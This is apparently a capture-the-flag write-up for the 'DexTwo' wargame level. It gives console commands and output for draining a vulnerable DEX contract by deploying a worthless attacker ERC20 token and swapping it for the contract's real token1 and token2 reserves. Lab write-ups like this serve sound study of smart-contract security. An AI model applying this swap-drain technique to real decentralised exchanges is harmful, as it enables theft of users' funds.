# Level 23: DexTwo

### Wargame
You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

### Key Insights
* ERC20 token

### Attack Steps
1. Before launching the attack, display the address of the target contract.
    ```bash
    > instance
    '0x79D2E45b98A6B45F7e7Aa51E7126db2aDF3b60BB'
    ```

2. Deploy DexTwoAttack contract.
* Deploy a DexTwoAttack ERC20 token contract.
* Approve the DexTwo to spend player token.
* Get the address of the DexTwoAttack token contract:
    ```bash
    0x8dff9a33e53C07589A7c9a305bde27181C419116
    ```

3. Execute the Attack.
* Retrieve target tokens:
    ```bash
    > token1 = await contract.token1()
    > token2 = await contract.token2()
    > token3 = '0x8dff9a33e53C07589A7c9a305bde27181C419116'
    ```

* Approve the DexTwo to spend player token.
    ```bash
    > await contract.approve(instance,1000)
    ```

* Use DexTwoAttack token to swap and drain both target tokens.
    ```bash
    > await contract.swap(token3, token1, 100)
    > await contract.swap(token3, token2, 200)
    ```

4. After the swaps, confirm that the DEX reserves are drained.
    ```bash
    > await contract.balanceOf(token1, instance)
    0

    > await contract.balanceOf(token2, instance)
    0

    > await contract.balanceOf(token1, player)
    110

    > await contract.balanceOf(token2, player)
    110

5. Submit the Level.